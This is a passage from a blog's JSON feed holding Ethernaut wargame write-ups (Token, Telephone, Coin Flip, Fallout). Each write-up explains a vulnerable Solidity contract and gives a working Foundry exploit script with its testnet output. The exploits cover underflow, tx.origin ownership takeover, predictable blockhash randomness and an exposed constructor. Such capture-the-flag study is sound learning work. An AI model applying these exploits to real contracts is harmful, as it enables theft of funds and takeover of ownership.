class=\"p\">[</span><span class=\"n\">_owner</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Overflow can occur in Solidity versions under 0.8.0.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Token.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">TokenSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Token</span> <span class=\"k\">public</span> <span class=\"n\">token_</span> <span class=\"o\">=</span> <span class=\"n\">Token</span><span class=\"p\">(</span><span class=\"mh\">0xc5176701831Dcf084be5f95617605D2107d97182</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"balance: \"</span><span class=\"p\">,</span> <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"mi\">21</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"balance: \"</span><span class=\"p\">,</span> <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/TokenSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†í] Compiling 1 files with Solc 0.6.12<span class=\"o\">[</span>‚†ë] Solc 0.6.12 finished <span class=\"k\">in </span>497.00msCompiler run successful!Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  balance:  20  balance:  115792089237316195423570985008687907853269984665640564039457584007913129639935<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001000007 gweiEstimated total gas used <span class=\"k\">for </span>script: 67542Estimated amount required: 0.000000067542472794 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x6b9a4361bf15dc0a907240c72dd64d9c5cfbffafd2bbfd0197ad7dd053aa115eBlock: 3677316Paid: 0.0000000489 ETH <span class=\"o\">(</span>48900 gas <span class=\"k\">*</span> 0.001 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.0000000489 ETH (48900 gas * avg 0.001 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Token/balanceofplayer.png\" alt=\"Image balanceofplayer\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Token/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/token",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","overflow"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/telephone",
            "title": "[Ethernaut] Telephone",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone {    address public owner;    constructor() {        owner = msg.sender;    }    function changeOwner(address _owner) public {        if (tx.origin != msg.sender) {            owner = _owner;        }    }}When initially creating a contract, the owner is set to msg.sender. However, in the changeOwner() function, if tx.origin and msg.sender are different, the value received as an argument is set as the owner.tx.origin is the address that first initiated the contract call (it‚Äôs always an EOA account),msg.sender is the address that last called the contract.If I call contract A, and contract A calls contract B, a difference will arise between tx.origin and msg.sender within contract B.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Telephone.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(Telephone telephone_, address _address) {        telephone_.changeOwner(_address);    }}contract TelephoneSol is Script {    Telephone public telephone_ = Telephone(0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"owner: \", telephone_.owner());        new Ex(telephone_, vm.envAddress(\"MY_ADDRESS\"));        console.log(\"owner: \", telephone_.owner());        vm.stopBroadcast();    }}$ forge script script/TelephoneSol.sol --broadcast --tc TelephoneSol[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 283.34msCompiler run successful!Script ran successfully.== Logs ==  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001913718 gweiEstimated total gas used for script: 107575Estimated amount required: 0.00000020586821385 ETH==========================‚†Å Sequence #1 on holesky | Waiting for pending transactions    ‚†† [Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d    ‚†≤ [00:00:08] [#####################################################################] 1/1 txes (0.0s)##### holesky‚úÖ  [Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274dContract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fCBlock: 3672184Paid: 0.000000158359337 ETH (82750 gas * 0.001913708 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Telephone</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">changeOwner</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span> <span class=\"o\">!=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When initially creating a contract, the <code class=\"language-plaintext highlighter-rouge\">owner</code> is set to <code class=\"language-plaintext highlighter-rouge\">msg.sender</code>. However, in the <code class=\"language-plaintext highlighter-rouge\">changeOwner()</code> function, if <code class=\"language-plaintext highlighter-rouge\">tx.origin</code> and <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> are different, <strong>the value received as an argument</strong> is set as the <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">tx.origin</code> is the address that first initiated the contract call (it‚Äôs always an EOA account),</p><p><code class=\"language-plaintext highlighter-rouge\">msg.sender</code> is the address that last called the contract.</p><p>If I call contract A, and contract A calls contract B, a difference will arise between <code class=\"language-plaintext highlighter-rouge\">tx.origin</code> and <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> within contract B.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Telephone.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">Telephone</span> <span class=\"n\">telephone_</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">changeOwner</span><span class=\"p\">(</span><span class=\"n\">_address</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">TelephoneSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Telephone</span> <span class=\"k\">public</span> <span class=\"n\">telephone_</span> <span class=\"o\">=</span> <span class=\"n\">Telephone</span><span class=\"p\">(</span><span class=\"mh\">0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">telephone_</span><span class=\"p\">,</span> <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/TelephoneSol.sol <span class=\"nt\">--broadcast</span> <span class=\"nt\">--tc</span> TelephoneSol<span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>283.34msCompiler run successful!Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001913718 gweiEstimated total gas used <span class=\"k\">for </span>script: 107575Estimated amount required: 0.00000020586821385 ETH<span class=\"o\">==========================</span>‚†Å Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚†† <span class=\"o\">[</span>Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d    ‚†≤ <span class=\"o\">[</span>00:00:08] <span class=\"o\">[</span><span class=\"c\">#####################################################################] 1/1 txes (0.0s)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274dContract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fCBlock: 3672184Paid: 0.000000158359337 ETH <span class=\"o\">(</span>82750 gas <span class=\"k\">*</span> 0.001913708 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Telephone/complete.png\" alt=\"Image complete\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Telephone/owner().png\" alt=\"Image owner\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/telephone",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","tx.origin"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/coin-flip",
            "title": "[Ethernaut] Coin Flip",
            "summary": null,
            "content_text": "AnalysisThe goal is  guess the correct outcome 10 times in a row.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip {    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() {        consecutiveWins = 0;    }    function flip(bool _guess) public returns (bool) {        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) {            revert();        }        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) {            consecutiveWins++;            return true;        } else {            consecutiveWins = 0;            return false;        }    }}Using to blackhash value to generate random numbers.Since this is accessible not only to the contract but also to external users, it becomes predictable.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/CoinFlip.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(CoinFlip coinflip_) {        uint256 blockValue = uint256(blockhash(block.number - 1));        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        coinflip_.flip(side);    }}contract CoinFlipSol is Script {    CoinFlip public coinflip_ = CoinFlip(0x97Cf73B713944bD171aEd799FEDdED4BC5Fd3765);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        new Ex(coinflip_);        console.log(\"Win counts: \", coinflip_.consecutiveWins());                vm.stopBroadcast();    }}$ forge script script/CoinFlipSol.sol --tc CoinFlipSol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Win counts:  10## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002187102 gweiEstimated total gas used for script: 123189Estimated amount required: 0.000000269426908278 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x0a5c9241d43f66408948fff9f14bad881a6f1717557f05d693967085b33fc4c9Contract Address: 0x0BBe439AF9BC57d2358965e1d78B2831290038F9Block: 3672028Paid: 0.000000207251214534 ETH (94761 gas * 0.002187094 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000207251214534 ETH (94761 gas * avg 0.002187094 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>guess the correct outcome 10 times in a row.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">CoinFlip</span> <span class=\"p\">{</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">consecutiveWins</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">lastHash</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">FACTOR</span> <span class=\"o\">=</span> <span class=\"mi\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">consecutiveWins</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">flip</span><span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">_guess</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">blockValue</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">blockhash</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">number</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">lastHash</span> <span class=\"o\">==</span> <span class=\"n\">blockValue</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span><span class=\"p\">();</span>        <span class=\"p\">}</span>        <span class=\"n\">lastHash</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span><span class=\"p\">;</span>        <span class=\"kt\">uint256</span> <span class=\"n\">coinFlip</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span> <span class=\"o\">/</span> <span class=\"n\">FACTOR</span><span class=\"p\">;</span>        <span class=\"kt\">bool</span> <span class=\"n\">side</span> <span class=\"o\">=</span> <span class=\"n\">coinFlip</span> <span class=\"o\">==</span> <span class=\"mi\">1</span> <span class=\"o\">?</span> <span class=\"nb\">true</span> <span class=\"o\">:</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">side</span> <span class=\"o\">==</span> <span class=\"n\">_guess</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">consecutiveWins</span><span class=\"o\">++</span><span class=\"p\">;</span>            <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">consecutiveWins</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>            <span class=\"k\">return</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Using to <code class=\"language-plaintext highlighter-rouge\">blackhash</code> value to generate random numbers.</p><p>Since this is accessible not only to the contract but also to external users, it becomes predictable.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/CoinFlip.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">uint256</span> <span class=\"k\">constant</span> <span class=\"n\">FACTOR</span> <span class=\"o\">=</span> <span class=\"mi\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">CoinFlip</span> <span class=\"n\">coinflip_</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">blockValue</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">blockhash</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">number</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"kt\">uint256</span> <span class=\"n\">coinFlip</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span> <span class=\"o\">/</span> <span class=\"n\">FACTOR</span><span class=\"p\">;</span>        <span class=\"kt\">bool</span> <span class=\"n\">side</span> <span class=\"o\">=</span> <span class=\"n\">coinFlip</span> <span class=\"o\">==</span> <span class=\"mi\">1</span> <span class=\"o\">?</span> <span class=\"nb\">true</span> <span class=\"o\">:</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"n\">coinflip_</span><span class=\"p\">.</span><span class=\"n\">flip</span><span class=\"p\">(</span><span class=\"n\">side</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">CoinFlipSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">CoinFlip</span> <span class=\"k\">public</span> <span class=\"n\">coinflip_</span> <span class=\"o\">=</span> <span class=\"n\">CoinFlip</span><span class=\"p\">(</span><span class=\"mh\">0x97Cf73B713944bD171aEd799FEDdED4BC5Fd3765</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">coinflip_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Win counts: \"</span><span class=\"p\">,</span> <span class=\"n\">coinflip_</span><span class=\"p\">.</span><span class=\"n\">consecutiveWins</span><span class=\"p\">());</span>                <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/CoinFlipSol.sol <span class=\"nt\">--tc</span> CoinFlipSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Win counts:  10<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002187102 gweiEstimated total gas used <span class=\"k\">for </span>script: 123189Estimated amount required: 0.000000269426908278 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x0a5c9241d43f66408948fff9f14bad881a6f1717557f05d693967085b33fc4c9Contract Address: 0x0BBe439AF9BC57d2358965e1d78B2831290038F9Block: 3672028Paid: 0.000000207251214534 ETH <span class=\"o\">(</span>94761 gas <span class=\"k\">*</span> 0.002187094 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000207251214534 ETH (94761 gas * avg 0.002187094 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Coin_Flip/complete.png\" alt=\"Image complete\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Coin_Flip/win.png\" alt=\"Image win\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/coin-flip",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallout",
            "title": "[Ethernaut] Fallout",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership of the contract below// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"openzeppelin-contracts-06/math/SafeMath.sol\";contract Fallout {    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable {        owner = msg.sender;        allocations[owner] = msg.value;    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function allocate() public payable {        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    }    function sendAllocation(address payable allocator) public {        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    }    function collectAllocations() public onlyOwner {        msg.sender.transfer(address(this).balance);    }    function allocatorBalance(address allocator) public view returns (uint256) {        return allocations[allocator];    }}Solidity 0.6.0 Documentation - constructors  üí° Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.For some reason, the intended constructor code was written as Fal1out(), preventing it from acting as a constructor and allowing external access, which enables claiming owner.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Fallout.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallout public fallout_ = Fallout(0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallout_.Fal1out();        console.log(\"Contract owner: \", fallout_.owner());        vm.stopBroadcast();    }}$ forge script script/FalloutSol.sol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used for script: 62992Estimated amount required: 0.000000132001373792 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH (45606 gas * 0.002095519 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
